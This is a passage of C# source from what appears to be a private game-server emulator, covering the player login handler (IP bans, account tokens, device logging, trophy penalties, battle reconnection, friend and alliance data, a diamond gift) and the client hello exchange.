                        Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                        return;
                    }
                    if (message.korunmalar == null || message.korunmalar == "")
                    {
                        File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                        Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                        return;
                    }
                    
                    AuthenticationOkMessage loginOk = new AuthenticationOkMessage();

                    if (!account.Avatar.ShouldRedirect)
                    {
                        loginOk.AccountId = account.AccountId;
                        loginOk.PassToken = account.PassToken;
                        loginOk.ServerEnvironment = "dev";
                    }
                    else
                    {
                        //account.Avatar.ShouldRedirect = false;
                        Account t = Accounts.Load(account.Avatar.RedirectId);
                        account = t;
                        loginOk.AccountId = t.AccountId;
                        loginOk.PassToken = t.PassToken;
                        loginOk.ServerEnvironment = "dev";
                    }

                    Connection.Send(loginOk);

                    HomeMode = HomeMode.LoadHomeState(new HomeGameListener(Connection), account.Home, account.Avatar, Events.GetEventsById(account.Home.PowerPlayGamesPlayed, account.Avatar.AccountId));
                    HomeMode.CharacterChanged += OnChangeCharacter;
                    if (string.IsNullOrEmpty(HomeMode.Home.firstIpAddress))
                    {
                        HomeMode.Home.firstIpAddress = Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0];
                    }

                    if (string.IsNullOrEmpty(HomeMode.Home.firstDevice))
                    {
                        HomeMode.Home.firstDevice = message.DeviceId;
                    }

                    if (string.IsNullOrEmpty(HomeMode.Home.firstDeviceLang))
                    {
                        HomeMode.Home.firstDeviceLang = $"{message.DeviceLang}";
                    }

                    HomeMode.Home.IpAddress = Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0];
                    HomeMode.Home.Device = message.DeviceId;
                    HomeMode.Home.DeviceLang = message.DeviceLang; // CIHAZ DILI cihaz dili CİHAZ DİLİ
                    HomeMode.Home.Majorsurum = message.Majorsurum;
                    HomeMode.Home.Minorsurum = message.Minorsurum;
                    HomeMode.Home.Buildsurum = message.Buildsurum;
                    HomeMode.Home.Dil = message.korunmalar;
                    HomeMode.Home.Sha = message.Sha;
                    if (HomeMode.Home.gizlielmas == 0)
                    {
                        HomeMode.Home.gizlielmas = 0;
                    }
                    if (HomeMode.Home.gizlielmas == 1)
                    {
                        HomeMode.Home.gizlielmas = 1;
                    }
                    /*if (HomeMode.Home.Sha == "d2b237661579b6b211322f760b9126ee33288e1e" && HomeMode.Home.gunc == 0 || HomeMode.Home.gunc == 1)
                    {
                        HomeMode.Home.gunc ++;
                        AllianceResponseMessage res = new AllianceResponseMessage();
                        res.ResponseType = 111111;
                        Connection.Send(res);
                    }*/
                    Console.WriteLine($"{HomeMode.Home.belesodul}");
                    //BattleLogMessage kk = new BattleLogMessage();
                    //Connection.Send(kk);
                    if (HomeMode.Avatar.ContentCreator == false && HomeMode.Home.ThumbnailId == 55) //content creator
                    {
                        HomeMode.Home.ThumbnailId = 0;
                    }

                    if (HomeMode.Avatar.HighestTrophies == 0 && HomeMode.Avatar.Trophies != 0)
                    {
                        HomeMode.Avatar.HighestTrophies = HomeMode.Avatar.Trophies;
                    }
                    CommandManager = new(HomeMode, Connection);

                    if (HomeMode.Avatar.BattleStartTime != new DateTime())
                    {
                        Hero h = HomeMode.Avatar.GetHero(HomeMode.Home.CharacterId);
                        int lose = 0;
                        int brawlerTrophies = h.Trophies;
                        if (brawlerTrophies <= 49)
                        {
                            lose = 0;
                        }
                        else if (50 <= brawlerTrophies && brawlerTrophies <= 99)
                        {
                            lose = -1;
                        }
                        else if (100 <= brawlerTrophies && brawlerTrophies <= 199)
                        {
                            lose = -2;
                        }
                        else if (200 <= brawlerTrophies && brawlerTrophies <= 299)
                        {
                            lose = -3;
                        }
                        else if (300 <= brawlerTrophies && brawlerTrophies <= 399)
                        {
                            lose = -4;
                        }
                        else if (400 <= brawlerTrophies && brawlerTrophies <= 499)
                        {
                            lose = -5;
                        }
                        else if (500 <= brawlerTrophies && brawlerTrophies <= 599)
                        {
                            lose = -6;
                        }
                        else if (600 <= brawlerTrophies && brawlerTrophies <= 699)
                        {
                            lose = -7;
                        }
                        else if (700 <= brawlerTrophies && brawlerTrophies <= 799)
                        {
                            lose = -8;
                        }
                        else if (800 <= brawlerTrophies && brawlerTrophies <= 899)
                        {
                            lose = -9;
                        }
                        else if (900 <= brawlerTrophies && brawlerTrophies <= 999)
                        {
                            lose = -10;
                        }
                        else if (1000 <= brawlerTrophies && brawlerTrophies <= 1099)
                        {
                            lose = -11;
                        }
                        else if (1100 <= brawlerTrophies && brawlerTrophies <= 1199)
                        {
                            lose = -12;
                        }
                        else if (brawlerTrophies >= 1200)
                        {
                            lose = -12;
                        }
                        h.AddTrophies(lose);
                        HomeMode.Home.PowerPlayGamesPlayed = Math.Max(0, HomeMode.Home.PowerPlayGamesPlayed - 1);
                        Connection.Home.Events = Events.GetEventsById(HomeMode.Home.PowerPlayGamesPlayed, Connection.Avatar.AccountId);
                        HomeMode.Avatar.BattleStartTime = new DateTime();
                    }


                    

                    BattleMode battle = null;
                    if (HomeMode.Avatar.BattleId > 0)
                    {
                        battle = Battles.Get(HomeMode.Avatar.BattleId);
                    }

                    if (battle == null)
                    {
                        OwnHomeDataMessage ohd = new OwnHomeDataMessage();
                        ohd.Home = HomeMode.Home;
                        ohd.Avatar = HomeMode.Avatar;
                        Connection.Send(ohd);
                    }
                    else
                    {
                        StartLoadingMessage startLoading = new StartLoadingMessage();
                        startLoading.LocationId = battle.Location.GetGlobalId();
                        startLoading.TeamIndex = HomeMode.Avatar.TeamIndex;
                        startLoading.OwnIndex = HomeMode.Avatar.OwnIndex;
                        startLoading.GameMode = battle.GetGameModeVariation() == 6 ? 6 : 1;
                        startLoading.Players.AddRange(battle.GetPlayers());
                        UDPSocket socket = UDPGateway.CreateSocket();
                        socket.TCPConnection = Connection;
                        socket.Battle = battle;
                        Connection.UdpSessionId = socket.SessionId;
                        battle.ChangePlayerSessionId(HomeMode.Avatar.UdpSessionId, socket.SessionId);
                        HomeMode.Avatar.UdpSessionId = socket.SessionId;
                        Connection.Send(startLoading);
                    }

                    Connection.Avatar.LastOnline = DateTime.UtcNow;

                    Sessions.Create(HomeMode, Connection);
                    if (true)
                    {
                        FriendListMessage friendList = new FriendListMessage();
                        friendList.Friends = HomeMode.Avatar.Friends.ToArray();
                        Connection.Send(friendList);



                        if (HomeMode.Avatar.AllianceRole != AllianceRole.None && HomeMode.Avatar.AllianceId > 0)
                        {
                            Alliance alliance = Alliances.Load(HomeMode.Avatar.AllianceId);

                            if (alliance != null)
                            {
                                SendMyAllianceData(alliance);
                                AllianceDataMessage data = new AllianceDataMessage();
                                data.Alliance = alliance;
                                data.IsMyAlliance = true;
                                Connection.Send(data);
                            }
                        }

                        foreach (Friend entry in HomeMode.Avatar.Friends.ToArray())
                        {
                            if (LogicServerListener.Instance.IsPlayerOnline(entry.AccountId))
                            {
                                FriendOnlineStatusEntryMessage statusEntryMessage = new FriendOnlineStatusEntryMessage();
                                statusEntryMessage.AvatarId = entry.AccountId;
                                statusEntryMessage.PlayerStatus = entry.Avatar.PlayerStatus;
                                Connection.Send(statusEntryMessage);
                            }
                        }

                        if (HomeMode.Avatar.TeamId > 0)
                        {
                            TeamMessage teamMessage = new TeamMessage();
                            teamMessage.Team = Teams.Get(HomeMode.Avatar.TeamId);
                            if (teamMessage.Team != null)
                            {
                                Connection.Send(teamMessage);
                                TeamMember member = teamMessage.Team.GetMember(HomeMode.Avatar.AccountId);
                                member.State = 0;
                                teamMessage.Team.TeamUpdated();
                            }
                        }
                    }
                    if (HomeMode.Home.gizlielmas == 0 && HomeMode.Home.yassecdi != 0)
                    {
                        LogicGiveDeliveryItemsCommand delivery = new LogicGiveDeliveryItemsCommand();
                        DeliveryUnit unit = new DeliveryUnit(100);
                        GatchaDrop reward = new GatchaDrop(8);//elmas
                        reward.Count = 5;
                        HomeMode.Home.gizlielmas = 1;
                        unit.AddDrop(reward);
                        unit.AddDrop(reward);
                        unit.AddDrop(reward);
                        unit.AddDrop(reward);
                        unit.AddDrop(reward);
                        unit.AddDrop(reward);
                        HomeMode.Avatar.AddDiamonds(25);

                        delivery.DeliveryUnits.Add(unit);
                        delivery.Execute(HomeMode);

                        AvailableServerCommandMessage messageq = new AvailableServerCommandMessage();
                        messageq.Command = delivery;

                        HomeMode.GameListener.SendMessage(messageq);
                    }
                }
            }
            //Connection.Send(new StartLatencyTestRequestMessage());
        }

        private void ClientHelloReceived(ClientHelloMessage message)
        {
            if (message.KeyVersion != PepperKey.VERSION)
            {
                //return;
            }

            Console.WriteLine(message.Major);
            Console.WriteLine(message.ClientSeed);
            Console.WriteLine(message.KeyVersion);

            Connection.Messaging.Seed = message.ClientSeed;
            Random r = new();

            Connection.Messaging.serversc = (byte)r.Next(1, 256);
            ServerHelloMessage hello = new ServerHelloMessage();
            hello.serversc = Connection.Messaging.serversc;
            hello.SetServerHelloToken(Connection.Messaging.SessionToken);
            Connection.Send(hello);
        }
    }
}
